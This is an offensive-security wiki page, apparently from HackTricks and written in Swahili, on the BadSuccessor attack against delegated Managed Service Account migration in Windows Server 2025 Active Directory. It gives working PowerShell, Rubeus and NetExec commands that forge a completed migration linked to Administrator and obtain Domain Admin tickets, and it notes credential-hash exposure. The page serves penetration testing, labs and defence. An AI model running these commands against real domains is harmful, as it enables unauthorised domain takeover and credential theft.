# BadSuccessor

{{#include ../../../banners/hacktricks-training.md}}

## Muhtasari

**BadSuccessor** hutumia vibaya workflow ya migration ya **delegated Managed Service Account** (**dMSA**) iliyoanzishwa katika **Windows Server 2025**. dMSA inaweza kuunganishwa na account ya zamani kupitia **`msDS-ManagedAccountPrecededByLink`** na kusogezwa kupitia migration states zilizohifadhiwa katika **`msDS-DelegatedMSAState`**. Ikiwa attacker anaweza kuunda dMSA katika OU inayoweza kuandikwa na kudhibiti attributes hizo, KDC inaweza kutoa tickets kwa dMSA inayodhibitiwa na attacker ikiwa na **authorization context ya account iliyounganishwa**.<sup>[[2]](#references)</sup>

Kwa vitendo, hii inamaanisha kuwa low-privileged user ambaye ana delegated OU rights pekee anaweza kuunda dMSA mpya, kuihusisha na `Administrator`, kukamilisha migration state, kisha kupata TGT ambayo PAC yake ina privileged groups kama **Domain Admins**.<sup>[[2]](#references)</sup>

## Maelezo muhimu ya dMSA migration

- dMSA ni feature ya **Windows Server 2025**.
- `Start-ADServiceAccountMigration` huweka migration katika hali ya **started**.
- `Complete-ADServiceAccountMigration` huweka migration katika hali ya **completed**.
- `msDS-DelegatedMSAState = 1` inamaanisha migration imeanza.
- `msDS-DelegatedMSAState = 2` inamaanisha migration imekamilika.
- Wakati wa legitimate migration, dMSA inakusudiwa kuchukua nafasi ya account iliyotangulia kwa uwazi, hivyo KDC/LSA huhifadhi access ambayo account ya awali ilikuwa nayo.<sup>[[3]](#references)</sup>

Microsoft Learn pia inaeleza kuwa wakati wa migration account ya awali huunganishwa na dMSA, na dMSA inakusudiwa kufikia kile ambacho account ya zamani ingeweza kufikia.<sup>[[3]](#references)</sup> Hili ndilo security assumption ambalo BadSuccessor hutumia vibaya.<sup>[[2]](#references)</sup>

## Mahitaji

1. Domain ambayo **dMSA ipo**, kumaanisha kuwa support ya **Windows Server 2025** iko upande wa AD.
2. Attacker anaweza **kuunda** objects za `msDS-DelegatedManagedServiceAccount` katika OU fulani, au ana equivalent broad child-object creation rights hapo.
3. Attacker anaweza **kuandika** dMSA attributes husika au kudhibiti kikamilifu dMSA aliyoiunda.
4. Attacker anaweza kuomba Kerberos tickets kutoka kwenye domain-joined context au kupitia tunnel inayofikia LDAP/Kerberos.<sup>[[2]](#references)</sup>

### Practical checks

Ishara iliyo wazi zaidi kwa operator ni kuthibitisha domain/forest level na kuhakikisha environment tayari inatumia Server 2025 stack mpya:
```powershell
Get-ADDomain | Select Name,DomainMode
Get-ADForest | Select Name,ForestMode
```
Ukiona values kama `Windows2025Domain` na `Windows2025Forest`, chukulia **BadSuccessor / dMSA migration abuse** kama ukaguzi wa kipaumbele.

Unaweza pia kuorodhesha OUs zenye ruhusa ya kuandikwa zilizokabidhiwa kwa ajili ya uundaji wa dMSA kwa kutumia public tooling:<sup>[[1]](#references)</sup>
```powershell
.\Get-BadSuccessorOUPermissions.ps1
```

```bash
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor
```
## Mtiririko wa abuse

1. Create dMSA katika OU ambapo una delegated create-child rights.
2. Weka **`msDS-ManagedAccountPrecededByLink`** kuwa DN ya privileged target kama vile `CN=Administrator,CN=Users,DC=corp,DC=local`.
3. Weka **`msDS-DelegatedMSAState`** kuwa `2` ili kuashiria kuwa migration imekamilika.
4. Request TGT ya dMSA mpya na utumie ticket iliyorejeshwa kufikia privileged services.<sup>[[2]](#references)</sup>

PowerShell example:<sup>[[2]](#references)</sup>
```powershell
New-ADServiceAccount -Name attacker_dMSA -DNSHostName host.corp.local -Path "OU=Delegated,DC=corp,DC=local"
Set-ADServiceAccount attacker_dMSA -Add @{
msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=corp,DC=local"
}
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```
Mifano ya maombi ya ticket / zana za uendeshaji:<sup>[[1]](#references)[[2]](#references)</sup>
```bash
Rubeus.exe asktgs /targetuser:attacker_dMSA$ /service:krbtgt/corp.local /dmsa /opsec /nowrap /ptt /ticket:<machine_tgt>
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor -o TARGET_OU='OU=Delegated,DC=corp,DC=local' DMSA_NAME=attacker TARGET_ACCOUNT=Administrator
```
## Kwa nini hii ni zaidi ya privilege escalation

Wakati wa migration halali, Windows pia inahitaji dMSA mpya ishughulikie tickets zilizotolewa kwa account ya awali kabla ya cutover. Hii ndiyo sababu material ya tickets inayohusiana na dMSA inaweza kujumuisha keys za **current** na **previous** katika mtiririko wa **`KERB-DMSA-KEY-PACKAGE`**.<sup>[[2]](#references)</sup>

Kwa migration bandia inayodhibitiwa na attacker, tabia hiyo inaweza kugeuza BadSuccessor kuwa:<sup>[[2]](#references)</sup>

- **Privilege escalation** kwa kurithi privileged group SIDs katika PAC.
- **Credential material exposure** kwa sababu previous-key handling inaweza kufichua material inayolingana na RC4/NT hash ya predecessor katika workflows zilizo vulnerable.

Hii inafanya technique hii kuwa muhimu kwa domain takeover ya moja kwa moja na kwa shughuli zinazofuata, kama vile pass-the-hash au credential compromise pana zaidi.

## Maelezo kuhusu hali ya patch

Tabia ya awali ya BadSuccessor **si suala la kinadharia la 2025 preview pekee**. Microsoft iliipa **CVE-2025-53779** na kuchapisha security update mnamo **Agosti 2025**.<sup>[[4]](#references)</sup> Endelea kuhifadhi attack hii katika documentation kwa:

- **labs / CTFs / assume-breach exercises**
- **Windows Server 2025 environments ambazo hazijawekewa patch**
- **validation ya OU delegations na dMSA exposure wakati wa assessments**

Usidhani kuwa Windows Server 2025 domain iko vulnerable kwa sababu tu dMSA ipo; thibitisha patch level na fanya testing kwa uangalifu.

## Tools

- [Akamai BadSuccessor tooling](https://github.com/akamai/BadSuccessor)
- [SharpSuccessor](https://github.com/logangoins/SharpSuccessor)
- [NetExec `badsuccessor` module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)

## References

- [1] [HTB: Eighteen - BadSuccessor dMSA abuse to Domain Admin (0xdf)](https://0xdf.gitlab.io/2026/04/11/htb-eighteen.html)
- [2] [Akamai - BadSuccessor: Abusing dMSA to Escalate Privileges in Active Directory](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [3] [Microsoft Learn - Delegated Managed Service Accounts overview](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/delegated-managed-service-accounts/delegated-managed-service-accounts-overview)
- [4] [Microsoft Security Response Center - CVE-2025-53779](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53779)

{{#include ../../../banners/hacktricks-training.md}}
